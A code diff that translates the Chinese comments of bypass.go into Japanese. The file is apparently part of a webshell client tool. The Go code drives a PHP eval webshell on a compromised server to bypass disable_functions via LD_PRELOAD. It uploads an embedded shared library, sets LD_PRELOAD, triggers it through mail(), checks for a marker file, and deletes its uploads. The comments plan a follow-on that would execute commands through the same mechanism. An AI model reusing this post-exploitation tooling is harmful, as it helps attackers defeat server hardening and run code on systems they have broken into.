@@ -1,21 +1,21 @@
-// bypass.go 内建 disable_functions 绕过探测(LD_PRELOAD 路径,复盘 R1 修复 P0-1)。
+// bypass.go は内蔵 disable_functions バイパスプローブ(LD_PRELOAD 経路、振り返り R1 の修正 P0-1)。
 //
-// 原理(PHP eval 马 exec 系全禁、但 mail()+putenv() 可用时):
+// 原理(PHP eval シェルで exec 系がすべて無効、ただし mail()+putenv() が使える場合):
 //
-//	① WriteFile 把平台内嵌的预编译 freestanding x86_64 .so 投递到目标随机路径
-//	   (.so 内嵌的路径槽在投递前改写为本次的探活标记文件路径);
-//	② eval 马内 putenv("LD_PRELOAD=<so>") 后调 mail():mail() 派生的子进程
-//	   (sendmail/sh)是动态链接 ELF,加载时动态链接器先执行 .so 构造器;
-//	③ 构造器只做一件事:往标记文件写一个字节后 _exit(0)——最小可行「加载即
-//	   证明」,不执行任何命令;eval 探针随后 file_exists 判定构造器是否真跑过。
+//	① WriteFile がプラットフォーム内蔵のコンパイル済み freestanding x86_64 .so を目標のランダムパスに投与する
+//	   (.so に埋め込まれたパススロットは投与前に今回の疎通確認マーカーファイルのパスへ書き換える)。
+//	② eval シェル内で putenv("LD_PRELOAD=<so>") の後に mail() を呼ぶ: mail() が起動する子プロセス
+//	   (sendmail/sh)は動的リンクされた ELF で、ロード時に動的リンカがまず .so のコンストラクタを実行する。
+//	③ コンストラクタは 1 つだけ仕事をする: マーカーファイルに 1 バイト書いて _exit(0)——最小限の「ロード即
+//	   証明」で、コマンドは一切実行しない。eval プローブはその後 file_exists でコンストラクタが実際に走ったか判定する。
 //
-// 本文件只做「探测与登记」:register_session 返回 disable_functions:true,
-// bypass:"ld_preload"。session_exec 经绕过执行是后续项(留口:.so 已留在目标侧
-// BypassLib 路径,执行载荷 .so 需另配,构造器入口协议沿用本文件的路径槽改写
-// 机制——投递前把命令/参数路径写进槽位即可)。
+// 本ファイルは「プローブと登録」だけを行う: register_session は disable_functions:true、
+// bypass:"ld_preload" を返す。session_exec からのバイパス実行は後続項目(導線: .so は目標側の
+// BypassLib パスに残してあり、実行用の .so は別途用意する。コンストラクタ入口のプロトコルは本ファイルのパススロット書き換え
+// 機構を踏襲する——投与前にコマンド/引数のパスをスロットへ書けばよい)。
 //
-// .so 产物由 session/ldpreloadgen(纯 Go 离线生成器,构建期外 `go run` 产出)
-// 生成并随仓库提交,go:embed 进二进制;无任何外部工具链依赖。
+// .so の成果物は session/ldpreloadgen(純 Go のオフライン生成器、ビルド期の外で `go run` して生成)
+// が生成してリポジトリにコミットされ、go:embed でバイナリに取り込まれる。外部ツールチェーンへの依存は一切ない。
 package session
 
 import (
@@ -29,33 +29,33 @@ import (
 	"time"
 )
 
-// ldpreloadSO 是离线预编译的 freestanding x86_64 ELF 共享库:构造器纯 syscall
-// (open/write/_exit),无 libc 依赖。布局与语义见 ldpreloadgen/main.go。
+// ldpreloadSO はオフラインでコンパイル済みの freestanding x86_64 ELF 共有ライブラリ: コンストラクタは純粋な syscall
+// (open/write/_exit)のみで、libc 依存はない。レイアウトと意味論は ldpreloadgen/main.go を参照。
 //
 //go:embed ldpreload_x86_64.so
 var ldpreloadSO []byte
 
 const (
-	// ldpreloadMagic 定位 .so 内的路径槽:magic 后紧跟 ldpreloadPathLen 字节的
-	// C 字符串槽(构造器 open 的目标路径,投递前改写为探活标记文件路径)。
+	// ldpreloadMagic は .so 内のパススロットを特定する: magic の直後に ldpreloadPathLen バイトの
+	// C 文字列スロットが続く(コンストラクタが open する目標パス。投与前に疎通確認マーカーファイルのパスへ書き換える)。
 	ldpreloadMagic   = "ARTEXLDPATHv1\x00\x00\x00"
 	ldpreloadPathLen = 128
-	// bypassTriggerTimeout 是 mail() 触发探针的超时(sendmail 派生可能慢)。
+	// bypassTriggerTimeout は mail() による発火プローブのタイムアウト(sendmail の起動は遅いことがある)。
 	bypassTriggerTimeout = 30 * time.Second
 )
 
-// LDPreloadLib 返回内嵌 .so 的只读副本(测试与生成器校验用)。
+// LDPreloadLib は内蔵 .so の読み取り専用コピーを返す(テストと生成器の検証用)。
 func LDPreloadLib() []byte { return append([]byte(nil), ldpreloadSO...) }
 
-// patchLDPreloadPath 把 .so 内的路径槽改写为 markPath(长度必须 < 槽长;改写后
-// NUL 结尾、余量清零,不带任何残留)。
+// patchLDPreloadPath は .so 内のパススロットを markPath に書き換える(長さはスロット長未満であること。書き換え後は
+// NUL 終端で残余をゼロ埋めし、残留を一切残さない)。
 func patchLDPreloadPath(blob []byte, markPath string) ([]byte, error) {
 	if markPath == "" || len(markPath) >= ldpreloadPathLen {
-		return nil, opError("bypass", "探活标记路径非法(空或长度 ≥ %d 字节)", ldpreloadPathLen)
+		return nil, opError("bypass", "疎通確認マーカーパスの不正(空、または長さ ≥ %d バイト)", ldpreloadPathLen)
 	}
 	i := bytes.Index(blob, []byte(ldpreloadMagic))
 	if i < 0 {
-		return nil, opError("bypass", "内嵌 .so 缺路径占位符(构建产物损坏)")
+		return nil, opError("bypass", "内蔵 .so にパスのプレースホルダがない(ビルド成果物の破損)")
 	}
 	out := append([]byte(nil), blob...)
 	slot := out[i+len(ldpreloadMagic) : i+len(ldpreloadMagic)+ldpreloadPathLen]
@@ -66,16 +66,16 @@ func patchLDPreloadPath(blob []byte, markPath string) ([]byte, error) {
 	return out, nil
 }
 
-// randHex 生成 n 字节随机数的 hex(2n 字符,目标侧随机路径用)。
+// randHex は n バイトの乱数の hex を生成する(2n 文字、目標側のランダムパス用)。
 func randHex(n int) string {
 	b := make([]byte, n)
 	_, _ = rand.Read(b)
 	return hex.EncodeToString(b)
 }
 
-// probeBypass 执行 LD_PRELOAD 绕过探测并回填 info 与 s 的 bypass 字段。
-// 只在 exec 系全禁且 mail()+putenv() 可用时调用。探测失败不拖垮登记:
-// 原因如实写进 info.BypassNote(诚实语义,不伪造可用)。
+// probeBypass は LD_PRELOAD バイパスプローブを実行し、info と s の bypass フィールドを埋める。
+// exec 系がすべて無効かつ mail()+putenv() が利用可能な場合にのみ呼ばれる。プローブの失敗は登録を妨げない:
+// 原因は info.BypassNote に正直に書く(誠実な意味論で、利用可能を偽装しない)。
 func (s *HTTPShell) probeBypass(ctx context.Context, info *ProbeInfo) {
 	soPath := defaultTmpPrefix + randHex(6) + ".so"
 	markPath := defaultTmpPrefix + randHex(6) + ".mark"
@@ -85,7 +85,7 @@ func (s *HTTPShell) probeBypass(ctx context.Context, info *ProbeInfo) {
 		return
 	}
 	if err := s.WriteFile(ctx, soPath, blob); err != nil {
-		info.BypassNote = "投递 .so 失败(文件写通道): " + err.Error()
+		info.BypassNote = ".so の投与に失敗しました(ファイル書き込み経路): " + err.Error()
 		return
 	}
 	m := newSentinel()
@@ -98,13 +98,13 @@ func (s *HTTPShell) probeBypass(ctx context.Context, info *ProbeInfo) {
 		`echo "\n` + m.end + `";`
 	body, err := s.post(ctx, url.Values{s.password: {payload}}, bypassTriggerTimeout)
 	if err != nil {
-		info.BypassNote = "绕过触发探针传输失败: " + err.Error()
+		info.BypassNote = "バイパス発火プローブの伝送に失敗しました: " + err.Error()
 		s.cleanupFile(ctx, soPath)
 		return
 	}
 	out, ok := m.extract(body)
 	if !ok {
-		info.BypassNote = "绕过触发探针哨兵缺失(疑似被 WAF 拦截/改写)。回显摘要: " + excerpt(body, 200)
+		info.BypassNote = "バイパス発火プローブのセンチネルがありません(WAF のブロック/書き換えの疑い)。エコー概要: " + excerpt(body, 200)
 		s.cleanupFile(ctx, soPath)
 		return
 	}
@@ -112,21 +112,21 @@ func (s *HTTPShell) probeBypass(ctx context.Context, info *ProbeInfo) {
 	case strings.Contains(out, "BYPASSOK"):
 		s.bypass, s.bypassLib = "ld_preload", soPath
 		info.Bypass, info.BypassLib = "ld_preload", soPath
-		info.BypassNote = "构造器探活确认:LD_PRELOAD 绕过可用(.so 已投递并留档;" +
-			"session_exec 接通绕过执行是后续项)"
+		info.BypassNote = "コンストラクタの疎通確認: LD_PRELOAD バイパスが利用可能(.so は投与済みで記録も残る。" +
+			"session_exec からのバイパス実行の接続は後続項目)"
 	default:
-		// NOBYPASS(mail/putenv 目标侧实际不可用)与 BYPASSFAIL(构造器未执行:
-		// mail 未派生子进程/加载器拒载/标记未落盘)统一如实上报,不留无用 .so。
+		// NOBYPASS(mail/putenv が目標側で実際には使えない)と BYPASSFAIL(コンストラクタ未実行:
+		// mail が子プロセスを起動しない/ローダが拒否/マーカーが書かれない)はまとめて正直に報告し、無用な .so を残さない。
 		s.cleanupFile(ctx, soPath)
 		if strings.Contains(out, "NOBYPASS") {
-			info.BypassNote = "目标侧 mail()/putenv() 实际不可用(与枚举探针不一致,可能被运行时装订),绕过不可用"
+			info.BypassNote = "目標側で mail()/putenv() が実際には使えない(列挙プローブと不一致、実行時の差し替えの可能性)。バイパス不可"
 		} else {
-			info.BypassNote = "构造器未执行(mail() 未派生子进程/动态链接器拒载 .so),绕过不可用"
+			info.BypassNote = "コンストラクタ未実行(mail() が子プロセスを起動しない/動的リンカが .so を拒否)。バイパス不可"
 		}
 	}
 }
 
-// cleanupFile 经 eval 马删除目标侧文件(best-effort,静默失败)。
+// cleanupFile は eval シェル経由で目標側のファイルを削除する(best-effort、失敗は黙って無視)。
 func (s *HTTPShell) cleanupFile(ctx context.Context, path string) {
 	m := newSentinel()
 	payload := `echo "` + m.start + `";@unlink(base64_decode("` + b64e([]byte(path)) + `"));echo "\n` + m.end + `";`
